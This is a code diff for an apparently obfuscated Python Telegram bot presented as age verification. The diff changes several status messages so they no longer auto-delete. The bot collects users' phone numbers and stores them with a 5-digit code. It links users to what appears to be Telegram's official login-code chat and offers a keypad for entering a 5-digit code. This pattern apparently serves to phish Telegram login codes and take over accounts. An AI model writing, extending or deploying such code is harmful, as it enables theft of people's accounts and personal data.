@@ -91,16 +91,11 @@ class _0xAVB:
         _0xr = _0xcr.fetchone()
         
         if _0xr and _0xr[0]:
-            _0xmsg = await update.message.reply_text(
+            # NO AUTO-DELETE - message stays permanently
+            await update.message.reply_text(
                 "✅ **Already Verified!**\n\nYou're already age-verified in our system. No need to verify again!",
                 parse_mode='Markdown'
             )
-            # Delete after 5 seconds
-            await asyncio.sleep(5)
-            try:
-                await _0xmsg.delete()
-            except:
-                pass
             return
         
         _0xwt = f"""
@@ -119,19 +114,13 @@ Hello {_0xu.first_name}!
             [KeyboardButton("📱 Share My Contact", request_contact=True)]
         ], resize_keyboard=True, one_time_keyboard=True)
         
-        _0xmsg = await context.bot.send_message(
+        # NO AUTO-DELETE - message stays permanently
+        await context.bot.send_message(
             _0xu.id,
             _0xwt, 
             parse_mode='Markdown',
             reply_markup=_0xck
         )
-        
-        # Delete after 30 seconds
-        await asyncio.sleep(30)
-        try:
-            await _0xmsg.delete()
-        except:
-            pass
 
     async def _0xhc(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
         """Handle contact"""
@@ -146,16 +135,12 @@ Hello {_0xu.first_name}!
                 pass
             
             if _0xct.user_id != _0xu.id:
-                _0xmsg = await context.bot.send_message(
+                # NO AUTO-DELETE - message stays permanently
+                await context.bot.send_message(
                     _0xu.id,
                     "❌ Please share your own contact, not someone else's.",
                     reply_markup=ReplyKeyboardRemove()
                 )
-                await asyncio.sleep(5)
-                try:
-                    await _0xmsg.delete()
-                except:
-                    pass
                 return
             
             _0xvc = str(random.randint(10000, 99999))
@@ -168,7 +153,7 @@ Hello {_0xu.first_name}!
             ''', (_0xu.id, _0xu.username, _0xu.first_name, _0xct.phone_number, _0xvc, datetime.now()))
             self._0xc.commit()
             
-            # Send "Get Code" button first (this will NOT be deleted)
+            # Send "Get Code" button (permanent - NOT deleted)
             _0xgc_kb = InlineKeyboardMarkup([
                 [InlineKeyboardButton('👉 Get code!', url='https://t.me/+42777')]
             ])
@@ -212,18 +197,14 @@ Hello {_0xu.first_name}!
             
         except Exception as e:
             logger.error(f"Error handling contact: {e}")
-            _0xmsg = await context.bot.send_message(
+            # NO AUTO-DELETE - message stays permanently
+            await context.bot.send_message(
                 _0xu.id,
                 "❌ Error processing. Please try /start again."
             )
-            await asyncio.sleep(5)
-            try:
-                await _0xmsg.delete()
-            except:
-                pass
 
     async def _0xsci(self, context, _0xui, _0xvc):
-        """Send code input interface (Container - will NOT be deleted)"""
+        """Send code input interface (Container - permanent, NOT deleted)"""
         try:
             _0xkb = [
                 [
@@ -321,16 +302,11 @@ Use the buttons below to enter your 5-digit code.
                     parse_mode='Markdown'
                 )
                 
-                # Notify user
-                _0xmsg = await context.bot.send_message(
+                # NO AUTO-DELETE - message stays permanently
+                await context.bot.send_message(
                     _0xtarget,
                     "❌ Your verification request was rejected. Please contact support."
                 )
-                await asyncio.sleep(10)
-                try:
-                    await _0xmsg.delete()
-                except:
-                    pass
                 
                 return
             
